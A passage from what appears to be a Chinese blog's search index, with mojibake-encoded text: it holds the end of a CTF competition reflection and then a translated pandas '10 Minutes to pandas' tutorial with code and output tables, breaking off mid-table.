çš„é¢˜<em>ï¼ˆæ²¡ç©è¿‡ï¼Œå†è§ï¼‰</em>â€¦â€¦ç›®ç¹äº†é—®å·<code>ï¼Ÿ</code>å¤§ä½¬ç–¯ç‹‚ç§’é¢˜ï¼Œï¼Ÿï¼Ÿï¼Ÿ</p><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡æ¯”èµ›å¹³å°æ˜¯ç”¨ docker éƒ¨ç½²çš„ CTFdï¼Œä¸Šäº†åŠ¨æ€ flag å’Œç‹¬ç«‹ç¯å¢ƒï¼Œä»è¿™ä¸ªè§’åº¦è€Œè¨€åšé¢˜æ„Ÿå—æŒºå¥½çš„ã€‚åªæ˜¯ç‹¬ç«‹ç¯å¢ƒç›´æ¥ç»‘å®šåˆ°äº†åŒä¸€ä¸ªåŸŸå ha1cyon-ctf.fun ä¸‹çš„ä¸åŒç«¯å£ï¼Œä¸åƒä¹‹å‰è§è¿‡çš„åŠ¨æ€åŸŸåï¼Œå¯èƒ½æ¯”è¾ƒå®¹æ˜“è¢«æ‰«æï¼Œä»è€Œå®¹æ˜“è¢«æ”»å‡»å§ï¼ˆçŒœçš„ã€‚</p><p>çœ‹äº†ä¸€ä¸‹å¹³å°æ˜¯ç›´æ¥ç”¨ Gunicorn æ­å»ºçš„ web æœåŠ¡å°±ä¸Šå…¬ç½‘äº†ï¼Œæ²¡å¥— Nginx ä¹‹ç±»çš„åä»£ï¼Œä¹Ÿæ²¡åŠ  WAF æ¥ç€ã€‚ä¸è¿‡æ²¡æ€ä¹ˆäº†è§£ä¹Ÿä¸å¤§æ¸…æ¥š Gunicorn åº”å¯¹é«˜å¹¶å‘çš„èƒ½åŠ›å¦‚ä½•ã€‚</p><p>æ€»ä½“æ„Ÿè§‰è¿™æ¬¡ CTF <del>è¿ç»´èµ›</del> <strong>é¢˜ç›®å¥½å¤šå•Šï¼Œéš¾åº¦å¥½å¤§å•Šï¼ŒåŸºæœ¬æ²¡è§è¿‡çš„å¥—è·¯å‘¢</strong>ã€‚é¢˜ç›®è´¨é‡è¿˜ä¸é”™ï¼Œå°±æ˜¯å•¥éƒ½ä¸ä¼šï¼Œå˜¤å˜¤å˜¤ã€‚</p><p>è™½è¯´ç®—æ˜¯ä¸šä½™ç©ç©çš„ï¼Œä½†ä¹Ÿæƒ³å¥½å¥½å­¦ç‚¹ä¸œè¥¿å‘¢ã€‚</p><p>çœ‹äº†å¤§ä½¬ä»¬çš„WPï¼Œè†œä¸€æ³¢ã€‚</p><p>é¡ºä¾¿å†è†œä¸€ä¸‹ç”¨å­¦ç”Ÿæœºçµæ´»åº”å¯¹é«˜å¹¶å‘çš„è¿ç»´å¤§ä½¬ã€‚</p><br><hr><p>å‘¨æ—¥è¿˜æ‰“äº†ä¸ªè™ç¬¦ CTFï¼ˆ<strong>2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“</strong>ï¼‰ï¼Œå‘ç°é¢˜ç›®å¤§éƒ½æ–°é²œå‡ºç‚‰çš„ã€‚æœç„¶çˆ†é›¶ï¼Œé¢˜ç›®åšåˆ°è‡ªé—­ã€‚ã€‚</p><p>Misc é¢˜ä¸€å †å¯†ç é¢˜ï¼Œå“‡å‘œä¸ä¼šåšâ€¦â€¦</p><p>æœ‰é“ python é€†å‘é¢˜<code>disasm</code>ï¼Œç»™äº†å¯¹å­—èŠ‚ç åç¼–è¯‘åå¾—åˆ°çš„ä»£ç ï¼ˆå¯ä»¥åˆ©ç”¨<code>dis.dis</code>å¸®åŠ©åˆ†æï¼‰ï¼Œå“‡ç¬¬ä¸€æ¬¡çœ‹åˆ°äº† python çš„åº•å±‚å®ç°ï¼ŒçœŸå°±å’Œæ±‡ç¼–å·®ä¸å¤šï¼Œæ„Ÿè§‰æŒºèƒ½å¸®åŠ©ç†è§£ Py åŸç†çš„ã€‚çœ‹äº†å‡ ç¯‡æ–‡ç« äº†è§£äº†ä¸€ä¸‹ï¼Œç„¶è€Œæ‰‹åŠ¨é€†å‘åˆ°è‡ªé—­éƒ½æ²¡åˆ†æä¸å®Œï¼Œæœ€åå°±æ”¾å¼ƒäº†ã€‚</p><p><a href="http://qingyunha.github.io/taotao/">A Python Interpreter Written in Python</a></p><p><a href="https://zhuanlan.zhihu.com/p/45101508">æ­»ç£•pythonå­—èŠ‚ç -æ‰‹å·¥è¿˜åŸpythonæºç </a></p><p>Web é¢˜ç”¨ nodejs ä¼ªé€  PHP å¯è¿˜è¡Œï¼Œç„¶è€ŒçœŸå¥½ï¼Œéƒ½æ˜¯æˆ‘ä¸ä¼šçš„ã€‚</p><p>ä¸å†™äº†ä¸å†™äº†ã€‚</p><p>ç­‰åé¢æœ‰æœºä¼šå†æ¥å¤ç°å§ã€‚</p><p><em>ï¼ˆæºœäº†æºœäº†</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®ç§‘å­¦ | ååˆ†é’Ÿå…¥é—¨pandas/å¸¸ç”¨æ–¹æ³•ç¬”è®°</title>
      <link href="2020/04/17/DataScience_10MinutesToPandas/"/>
      <url>2020/04/17/DataScience_10MinutesToPandas/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/04/17/DataScience_10MinutesToPandas/pandas.jpg" alt="pandas"></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ€è¿‘å¯¹<strong>æ•°æ®ç§‘å­¦</strong>æœ‰ç‚¹æ„Ÿå…´è¶£ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ python ä¸­ç”¨æ¥åšæ•°æ®å¤„ç†å¸¸ç”¨çš„æœ‰ numpyã€pandas ç­‰æ¨¡å—ï¼Œå®ƒä»¬åŠŸèƒ½éå¸¸å¼ºå¤§ã€‚</p><p>è€ƒè™‘åˆ°æœ‰é¡¹ç›®æ­£å¥½è¦ç”¨åˆ° pandasï¼Œè¿™æ¬¡å°±æ¥å­¦ä¸€ä¸‹å§ã€‚<small><em>ï¼ˆæŒºä¹…ä¹‹å‰å°±æƒ³å­¦çš„ï¼Œä¸€ç›´å’•</em></small></p><p>çœ‹åˆ°ç½‘ä¸Šæ¨èäº†å®˜æ–¹çš„ <a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/10min.html">10 Minutes to pandas</a>ï¼Œå°±å»çœ‹äº†ä¸€ä¸‹ï¼Œç¿»è¯‘äº†ä¸€ä¸‹å®˜æ–¹çš„æ•™ç¨‹ï¼Œè‡ªå·±è·‘äº†ä»£ç ï¼Œé¡ºä¾¿å†è®°äº†ç‚¹ç¬”è®°å§ã€‚</p><p>ä¸‹é¢çš„å†…å®¹ä¸»è¦å‚è€ƒçš„æ˜¯<em>10 Minutes to pandas</em>ï¼ˆ<del>ç„¶è€Œçœ‹äº†ä¸€æ™šä¸Š</del>ï¼‰ï¼Œè¿è¡Œç¯å¢ƒä¸º <strong>Jupyter Notebook</strong>ã€‚</p><p>è¿™ç¯‡åšå®¢ä¹Ÿæ˜¯åœ¨ä» Jupyter Notebook é‡Œå¯¼å‡ºçš„ markdown åŸºç¡€ä¸Šå®Œæˆçš„ï¼ŒæŒºæ–¹ä¾¿çš„å‘¢ã€‚ï¼ˆæœ‰äº›åœ°æ–¹å¯èƒ½ç”±äºåšå®¢æ ·å¼çš„åŸå› æ˜¾ç¤ºä¼šæœ‰ç‚¹é—®é¢˜ï¼Œå‡‘åˆç€çœ‹ä¸€çœ‹å§ã€‚</p><p><del>åé¢æœ‰ç©ºå†æ•´ç†ä¸€ä¸‹</del>ï¼Œæ”¾ä¸ª Jupyter Notebook çš„<code>.ipynb</code>ç‰ˆæœ¬å§ã€‚</p><p><strong>â€”-&gt;è¯¦è§æ–‡æœ«çš„æ›´æ–°ï¼</strong></p><br><h2 id="0x01-å¯¼å…¥æ¨¡å—"><a href="#0x01-å¯¼å…¥æ¨¡å—" class="headerlink" title="0x01 å¯¼å…¥æ¨¡å—"></a>0x01 å¯¼å…¥æ¨¡å—</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np</code></pre><p>è¿™äº›éƒ½æ˜¯å¸¸ç”¨åˆ«åäº†å‘¢ï¼ˆ</p><h2 id="0x02-åˆ›å»ºå¯¹è±¡-Object-Creation"><a href="#0x02-åˆ›å»ºå¯¹è±¡-Object-Creation" class="headerlink" title="0x02 åˆ›å»ºå¯¹è±¡ Object Creation"></a>0x02 åˆ›å»ºå¯¹è±¡ Object Creation</h2><p>ä¼ é€’ä¸€ä¸ªlistå¯¹è±¡æ¥åˆ›å»ºä¸€ä¸ªSeriesï¼Œpandasä¼šé»˜è®¤åˆ›å»ºæ•´å‹ç´¢å¼•(index)ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s</code></pre><pre><code>0    1.01    3.02    5.03    NaN4    6.05    8.0dtype: float64</code></pre><p>ä¼ é€’ä¸€ä¸ªnumpy arrayï¼Œæ—¶é—´ç´¢å¼•ä»¥åŠåˆ—æ ‡ç­¾æ¥åˆ›å»ºä¸€ä¸ªDataFrame</p><pre class="language-python" data-language="python"><code class="language-python">dates <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'20200416'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>dates</code></pre><pre><code>DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19',               '2020-04-20', '2020-04-21'],              dtype='datetime64[ns]', freq='D')</code></pre><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>dates<span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><p>ä¼ é€’ä¸€ä¸ªèƒ½å¤Ÿè¢«è½¬æ¢æˆç±»ä¼¼åºåˆ—ç»“æ„çš„å­—å…¸å¯¹è±¡æ¥åˆ›å»ºä¸€ä¸ªDataFrame</p><pre class="language-python" data-language="python"><code class="language-python">df2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">'A'</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token string">'B'</span> <span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Timestamp<span class="token punctuation">(</span><span class="token string">'20200416183800'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span><span class="token string">'float32'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'D'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span><span class="token string">'int32'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'E'</span> <span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Categorical<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token string">"train"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token string">"train"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'F'</span> <span class="token punctuation">:</span> <span class="token string">'foo'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>df2</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>test</td>      <td>foo</td>    </tr>    <tr>      <th>1</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>train</td>      <td>foo</td>    </tr>    <tr>      <th>2</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>test</td>      <td>foo</td>    </tr>    <tr>      <th>3</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>train</td>      <td>foo</td>    </tr>  </tbody></table></div><p>æŸ¥çœ‹ä»–ä»¬çš„æ•°æ®ç±»å‹(dtypes).</p><pre class="language-python" data-language="python"><code class="language-python">df2<span class="token punctuation">.</span>dtypes</code></pre><pre><code>A           float64B    datetime64[ns]C           float32D             int32E          categoryF            objectdtype: object</code></pre><p>åœ¨ IPython é‡Œè¾“å…¥ <code>df2.</code>ï¼ŒæŒ‰ä¸‹ TAB é”®ï¼Œä¼šæœ‰å¸¸ç”¨çš„ä»£ç æç¤ºã€‚</p><p>è¿™é‡Œæˆ‘æ˜¯åœ¨ Jupyter Notebook ä¸­è·‘ï¼Œä¹Ÿæœ‰ç±»ä¼¼æ•ˆæœã€‚ä¸ºäº†æ–¹ä¾¿å±•ç¤ºè¿™é‡Œç”¨<code>dir</code>æ¥åˆ—å‡ºæ¥å§ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">dir</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span></code></pre><pre><code>['A', 'B', 'C', 'D', 'E', 'F', 'T', ######################...########### 'to_feather', 'to_gbq', 'to_hdf', 'to_html', 'to_json', 'to_latex', 'to_msgpack', 'to_numpy', 'to_panel', 'to_parquet', 'to_period', 'to_pickle', 'to_records', 'to_sparse', 'to_sql', 'to_stata', 'to_string', 'to_timestamp', 'to_xarray', 'transform', 'transpose', 'truediv', 'truncate', 'tshift', 'tz_convert', 'tz_localize', 'unstack', 'update', 'values', 'var', 'where', 'xs']</code></pre><h2 id="0x03-æŸ¥çœ‹æ•°æ®-Viewing-Data"><a href="#0x03-æŸ¥çœ‹æ•°æ®-Viewing-Data" class="headerlink" title="0x03 æŸ¥çœ‹æ•°æ® Viewing Data"></a>0x03 æŸ¥çœ‹æ•°æ® Viewing Data</h2><p>æŸ¥çœ‹ frame ä¸­å¤´éƒ¨å’Œå°¾éƒ¨çš„è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># æŸ¥çœ‹å‰äº”è¡Œæ•°æ®</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># å‰ä¸¤è¡Œ</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>tail<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># å€’æ•°ä¸‰è¡Œ</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><p>æ˜¾ç¤ºç´¢å¼•ã€åˆ—å’Œåº•å±‚çš„(underlying) numpy æ•°æ®</p><pre class="language-python" data-language="python"><code class="language-python">df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>index</code></pre><pre><code>DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19',               '2020-04-20', '2020-04-21'],              dtype='datetime64[ns]', freq='D')</code></pre><pre class="language-python" data-language="python"><code class="language-python">df2<span class="token punctuation">.</span>index</code></pre><pre><code>Int64Index([0, 1, 2, 3], dtype='int64')</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>columns</code></pre><pre><code>Index(['A', 'B', 'C', 'D'], dtype='object')</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>values</code></pre><pre><code>array([[-0.22808386,  0.71252123,  0.74337822,  0.52682341],       [-0.42392275,  0.56434629, -2.31893066,  0.08093058],       [-2.03224294,  2.04682736,  1.17661398, -0.3655562 ],       [-1.20000469,  1.10999124, -1.52780407,  1.06864157],       [-0.53503099,  1.35142044,  0.90786509, -1.07401348],       [-0.61473412,  0.02714293, -0.42087502, -0.33381946]])</code></pre><pre class="language-python" data-language="python"><code class="language-python">df2<span class="token punctuation">.</span>values</code></pre><pre><code>array([[1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'],       [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo'],       [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'],       [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo']],      dtype=object)</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>columns<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>values<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;&lt;class 'pandas.core.indexes.base.Index'&gt;&lt;class 'numpy.ndarray'&gt;</code></pre><p><code>describe</code> å‡½æ•°å¯¹äºæ•°æ®çš„å¿«é€Ÿç»Ÿè®¡æ±‡æ€»</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>6.000000</td>      <td>6.000000</td>      <td>6.000000</td>      <td>6.000000</td>    </tr>    <tr>      <th>mean</th>      <td>-0.839003</td>      <td>0.968708</td>      <td>-0.239959</td>      <td>-0.016166</td>    </tr>    <tr>      <th>std</th>      <td>0.669679</td>      <td>0.699208</td>      <td>1.435586</td>      <td>0.751411</td>    </tr>    <tr>      <th>min</th>      <td>-2.032243</td>      <td>0.027143</td>      <td>-2.318931</td>      <td>-1.074013</td>    </tr>    <tr>      <th>25%</th>      <td>-1.053687</td>      <td>0.601390</td>      <td>-1.251072</td>      <td>-0.357622</td>    </tr>    <tr>      <th>50%</th>      <td>-0.574883</td>      <td>0.911256</td>      <td>0.161252</td>      <td>-0.126444</td>    </tr>    <tr>      <th>75%</th>      <td>-0.451700</td>      <td>1.291063</td>      <td>0.866743</td>      <td>0.415350</td>    </tr>    <tr>      <th>max</th>      <td>-0.228084</td>      <td>2.046827</td>      <td>1.176614</td>      <td>1.068642</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df2<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>4.0</td>      <td>4.0</td>      <td>4.0</td>    </tr>    <tr>      <th>mean</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>std</th>      <td>0.0</td>      <td>0.0</td>      <td>0.0</td>    </tr>    <tr>      <th>min</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>25%</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>50%</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>75%</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>max</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>  </tbody></table></div><p>å¯¹æ•°æ®è¿›è¡Œè½¬ç½®(Transposing)</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>T</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>2020-04-16 00:00:00</th>      <th>2020-04-17 00:00:00</th>      <th>2020-04-18 00:00:00</th>      <th>2020-04-19 00:00:00</th>      <th>2020-04-20 00:00:00</th>      <th>2020-04-21 00:00:00</th>    </tr>  </thead>  <tbody>    <tr>      <th>A</th>      <td>-0.228084</td>      <td>-0.423923</td>      <td>-2.032243</td>      <td>-1.200005</td>      <td>-0.535031</td>      <td>-0.614734</td>    </tr>    <tr>      <th>B</th>      <td>0.712521</td>      <td>0.564346</td>      <td>2.046827</td>      <td>1.109991</td>      <td>1.351420</td>      <td>0.027143</td>    </tr>    <tr>      <th>C</th>      <td>0.743378</td>      <td>-2.318931</td>      <td>1.176614</td>      <td>-1.527804</td>      <td>0.907865</td>      <td>-0.420875</td>    </tr>    <tr>      <th>D</th>      <td>0.526823</td>      <td>0.080931</td>      <td>-0.365556</td>      <td>1.068642</td>      <td>-1.074013</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df2<span class="token punctuation">.</span>T</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>0</th>      <th>1</th>      <th>2</th>      <th>3</th>    </tr>  </thead>  <tbody>    <tr>      <th>A</th>      <td>1</td>      <td>1</td>      <td>1</td>      <td>1</td>    </tr>    <tr>      <th>B</th>      <td>2020-04-16 18:38:00</td>      <td>2020-04-16 18:38:00</td>      <td>2020-04-16 18:38:00</td>      <td>2020-04-16 18:38:00</td>    </tr>    <tr>      <th>C</th>      <td>1</td>      <td>1</td>      <td>1</td>      <td>1</td>    </tr>    <tr>      <th>D</th>      <td>3</td>      <td>3</td>      <td>3</td>      <td>3</td>    </tr>    <tr>      <th>E</th>      <td>test</td>      <td>train</td>      